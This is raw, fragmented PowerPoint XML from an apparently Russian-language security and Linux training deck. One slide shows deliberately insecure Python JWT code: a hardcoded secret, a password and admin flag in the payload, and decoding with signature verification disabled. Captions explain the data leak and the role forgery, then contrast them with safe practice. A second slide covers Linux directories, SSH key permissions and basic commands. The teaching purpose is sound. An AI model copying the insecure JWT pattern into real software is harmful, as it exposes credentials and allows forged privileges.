              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{688DB4B7-074A-4A71-81C0-A7BB4770A49D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="403860" y="3341370"/>
            <a:ext cx="5433060" cy="3116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import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88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jwt</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1088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88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SECRET_KEY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= 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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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my_secret_key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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="9CDCFE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sensitive_payload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= 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{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"username"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 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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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alex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,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"password"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 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"SuperSecretPassword123"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,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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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is_admin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 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True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}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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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token = </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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jwt.encode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88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sensitive_payload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, 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SECRET_KEY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, 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7BA7D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algorithm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=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"HS256"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88" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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try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88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unsafe_data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= </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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jwt.decode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token, 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7BA7D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options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=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{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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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verify_signature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 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False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}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print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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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Распарсено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88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без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88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проверки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:"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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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unsafe_data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except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Exception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as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88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print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</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088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Ошибка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:"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, e</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1088" b="0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F23BCF-DB10-F184-FA95-B4C560D38186}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="291863" y="1845289"/>
            <a:ext cx="56415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Aptos"/>
              </a:rPr>
              <a:t>Утечка данных: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/>
              </a:rPr>
              <a:t>Base64 не шифрует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/>
              </a:rPr>
              <a:t>payload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/>
              </a:rPr>
              <a:t> — пароль виден всем.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FC458A-488D-BD08-77E6-AF7EE814211F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="291862" y="2417770"/>
            <a:ext cx="57127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Aptos"/>
              </a:rPr>
              <a:t>Подделка роли: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</a:rPr>
              <a:t>Отключение верификации (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</a:rPr>
              <a:t>verify_signature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</a:rPr>
              <a:t>=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</a:rPr>
              <a:t>False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</a:rPr>
              <a:t>) позволяет серверу слепо верить измененным данным.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43F44B-9ED6-9BC5-FDAD-2D04F687E0A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7415564" y="1383624"/>
            <a:ext cx="2512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/>
              </a:rPr>
              <a:t>Безопасный код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569E9F-7924-CF8C-3A22-3A1F605A2976}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6004562" y="1845288"/>
            <a:ext cx="50599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Aptos"/>
              </a:rPr>
              <a:t>Минимизация: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Aptos"/>
              </a:rPr>
              <a:t> в токене хранятся только нужные утверждения без паролей.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DEC37F-25BF-BCB4-5CF1-11187699FDAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6004561" y="2408439"/>
            <a:ext cx="51513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Aptos"/>
              </a:rPr>
              <a:t>Строгая проверка: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Aptos"/>
              </a:rPr>
              <a:t> подпись и допустимый алгоритм позволяют обнаружить подмену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3676776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C3F9F189-EE5C-4174-80A9-2C16BDE86FC0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ru-RU" sz="33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Файлова</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="33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</a:rPr>
              <a:t>я система </a:t>
            </a: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</a:rPr>
              <a:t>Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="33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</a:rPr>
              <a:t>и работа с ней</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="3300" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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E2E35255-C12E-6280-AD7B-F01ABCF5A38E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3924300" y="2650777"/>
            <a:ext cx="952500" cy="352425"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16216"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F2836"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="C472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57774630-29A9-3D47-BE8D-F92BCBB075E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1162050" y="3231802"/>
            <a:ext cx="1219200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10416"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B232E"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2D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14B7EA94-ADE0-2C67-60FF-38F601416AE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2476500" y="3231802"/>
            <a:ext cx="1219200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10416"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B232E"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="C472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56C4521D-10E7-FF5A-BA10-4BA01B2B5026}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3790950" y="3231802"/>
            <a:ext cx="1219200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10416"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B232E"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="C472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DAEFCB87-4491-6741-E72B-6396D4AFF734}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5105400" y="3231802"/>
            <a:ext cx="1219200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10416"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B232E"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="C472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CC1448B1-779F-9F47-16E9-56EF9A581002}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419850" y="3231802"/>
            <a:ext cx="1219200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10416"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B232E"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2D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5885DA8A-EFC7-BE47-77AE-70829B77C45A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2373659" y="3879502"/>
            <a:ext cx="1287809" cy="976312"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4878"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A23"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A4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958A5908-72BC-EC7F-21DA-B1BE8FCB3FDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3756719" y="3879502"/>
            <a:ext cx="1287809" cy="976312"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4878"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A23"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A4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11BE2046-0D37-E989-AC6B-3759E64872ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5139779" y="3879502"/>
            <a:ext cx="1287809" cy="976312"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4878"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141A23"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A4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9" name="Picture 14" descr="image.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EBC64118-680F-D4D9-81F6-018AEED6C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3003202"/>
            <a:ext cx="6477000" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="31" name="Picture 15" descr="image.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{524F3D78-21AB-A305-7042-967A9E526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625" y="3689002"/>
            <a:ext cx="19050" cy="190500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="33" name="Picture 16" descr="image.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BC72019F-B08E-4DB4-F000-AA451BCC5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025" y="3689002"/>
            <a:ext cx="19050" cy="190500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="35" name="Picture 17" descr="image.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70520D47-6308-7364-F806-2B7EC17B5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6425" y="3689002"/>
            <a:ext cx="19050" cy="1905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7E851B1-E8EC-86CA-DDD0-E5D0F48ECE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="2615058"/>
            <a:ext cx="33432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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter"/>
              </a:rPr>
              <a:t>КОМАНДЫ РАБОТЫ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AE4A78-B6BC-4146-4057-A4E0D9964B4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4200525" y="2717452"/>
            <a:ext cx="390525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etBrains Mono"/>
              </a:rPr>
              <a:t>/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A38765-CE31-B772-E9BE-D34D650B444E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="3308002"/>
            <a:ext cx="14097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etBrains Mono"/>
              </a:rPr>
              <a:t>/bin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495234E-E25A-47D3-091D-9E609C082133}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="3498502"/>
            <a:ext cx="14097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Inter"/>
              </a:rPr>
              <a:t>утилиты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472DB0D-FE55-B1BD-139E-B39F488F5151}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2381250" y="3308002"/>
            <a:ext cx="14097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etBrains Mono"/>
              </a:rPr>
              <a:t>/etc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F476522-0B65-AD09-2AD5-C6F75EB2017B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2381250" y="3498502"/>
            <a:ext cx="14097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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter"/>
              </a:rPr>
              <a:t>конфиги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2A694E9-9A9D-EB10-1906-9DE393BF27F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3695700" y="3308002"/>
            <a:ext cx="14097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etBrains Mono"/>
              </a:rPr>
              <a:t>/home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78303EB-C40B-F36C-79A7-7A5D8E1C58F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3695700" y="3498502"/>
            <a:ext cx="14097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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter"/>
              </a:rPr>
              <a:t>пользователи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FE88068-93DB-42A0-DD33-8A073699F80C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5010150" y="3308002"/>
            <a:ext cx="14097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etBrains Mono"/>
              </a:rPr>
              <a:t>/var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7C54CD6-8CB5-6C99-19AC-C701D2E60476}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5010150" y="3498502"/>
            <a:ext cx="14097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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Inter"/>
              </a:rPr>
              <a:t>логи / данные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65BBB92-B0EA-009C-0753-3422929C18BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6324600" y="3308002"/>
            <a:ext cx="14097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etBrains Mono"/>
              </a:rPr>
              <a:t>/tmp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C63F534-E672-21BF-4CA8-A61176D1287B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6324600" y="3498502"/>
            <a:ext cx="14097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Inter"/>
              </a:rPr>
              <a:t>временные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B7603A0-EABA-B219-6E9B-19275C2572A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2459384" y="3965227"/>
            <a:ext cx="1211609" cy="143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ts val="12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25" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>ssl/ &amp; letsencrypt/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A082152-6852-3D44-32B9-4566EF864541}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2459384" y="4298602"/>
            <a:ext cx="1402109" cy="14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ts val="12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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t>├── certs/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35BF338-5531-2BF7-A456-ED7A5F89C6AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2459384" y="4455765"/>
            <a:ext cx="1402109" cy="143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ts val="12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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t>└── </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="82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etBrains Mono"/>
              </a:rPr>
              <a:t>private/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="825" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t> </a:t>
            </a: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JetBrains Mono"/>
              </a:rPr>
              <a:t>400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16898DD-7BCA-CB78-8E84-917C71B0A327}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3842444" y="3965227"/>
            <a:ext cx="1402109" cy="143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ts val="12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25" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>~/.ssh/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CEAEA80-7B80-DACA-3B8B-AB143B2CF486}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3842444" y="4141440"/>
            <a:ext cx="1211609" cy="14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ts val="12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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t>├── </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="82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etBrains Mono"/>
              </a:rPr>
              <a:t>id_ed25519</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="825" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t> </a:t>
            </a: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JetBrains Mono"/>
              </a:rPr>
              <a:t>600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A42A9E4-AE8C-AE62-FFCE-1254EE4E1B5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3842444" y="4455765"/>
            <a:ext cx="1211609" cy="143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ts val="12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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t>└── authorized_keys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205D91C-68D0-BCAE-D12F-C834050681D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5225504" y="3965227"/>
            <a:ext cx="1211609" cy="143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ts val="12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25" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>lib/docker/ &amp; log/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E74DA85-262A-0078-93E3-1AB3713E03D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5225504" y="4298602"/>
            <a:ext cx="1402109" cy="14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ts val="12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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t>├── </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="82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etBrains Mono"/>
              </a:rPr>
              <a:t>volumes/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D5BFDF7-A8C2-6220-CCF2-634FB330ABAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5225504" y="4455765"/>
            <a:ext cx="1211609" cy="143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ts val="12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25" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof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JetBrains Mono"/>
              </a:rPr>
              <a:t>└── auth.log / syslog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B82A719-D242-6613-A6AC-E5F188BD7713}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="2929383"/>
            <a:ext cx="5143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etBrains Mono"/>
              </a:rPr>
              <a:t>pwd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D98FB8D-9803-F0F4-7B06-8D778CDC1516}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10791825" y="2938908"/>
            <a:ext cx="11525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Inter"/>
              </a:rPr>
              <a:t>где я нахожусь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6FF7A25-A6B8-E83A-EB43-50B8C9AA5456}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="3186558"/>
            <a:ext cx="438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etBrains Mono"/>
              </a:rPr>
              <a:t>cd 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557FD8C-0237-DC10-C7C7-084AD32E095B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10744200" y="3196083"/>
            <a:ext cx="12001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Inter"/>
              </a:rPr>
              <a:t>перейти в папку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973DB9D-826F-97DE-3757-5ACD4E052755}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="3443733"/>
            <a:ext cx="7429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etBrains Mono"/>
              </a:rPr>
              <a:t>ls </a:t>
            </a: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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>-la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38EF0F-3213-A623-959E-D85BC0756639}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10696575" y="3453258"/>
            <a:ext cx="12477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Inter"/>
              </a:rPr>
              <a:t>скрытые + права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72B5ED0-66FF-B420-1E95-054A4D34D28B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="3691829"/>
            <a:ext cx="8953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etBrains Mono"/>
              </a:rPr>
              <a:t>mkdir </a:t>
            </a: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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>-p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37CB091-B947-6FA1-608A-D607313E6080}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10715625" y="3701354"/>
            <a:ext cx="12287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Inter"/>
              </a:rPr>
              <a:t>создать цепочку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EDCA86C-45A0-00CB-9DED-57835CA46A1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="3949004"/>
            <a:ext cx="1047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etBrains Mono"/>
              </a:rPr>
              <a:t>cp </a:t>
            </a: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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>-r</a:t>
            </a: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etBrains Mono"/>
              </a:rPr>
              <a:t> / mv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8972417-AD97-A03C-B024-00B9E4D8D966}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10439400" y="3958529"/>
            <a:ext cx="1524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Inter"/>
              </a:rPr>
              <a:t>копировать / перенос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346A11B-61CB-F4BE-B7C7-8B612957C4F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="4206179"/>
            <a:ext cx="7429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etBrains Mono"/>
              </a:rPr>
              <a:t>rm </a:t>
            </a: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C4726E"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>-rf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B368005-E640-4F5C-B0DF-8283DF4CEE8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10848975" y="4215704"/>
            <a:ext cx="10953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Inter"/>
              </a:rPr>
              <a:t>удалить папку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FFD9ED2-BA11-460D-2330-447B907CD7E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8848725" y="4463354"/>
            <a:ext cx="9715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etBrains Mono"/>
              </a:rPr>
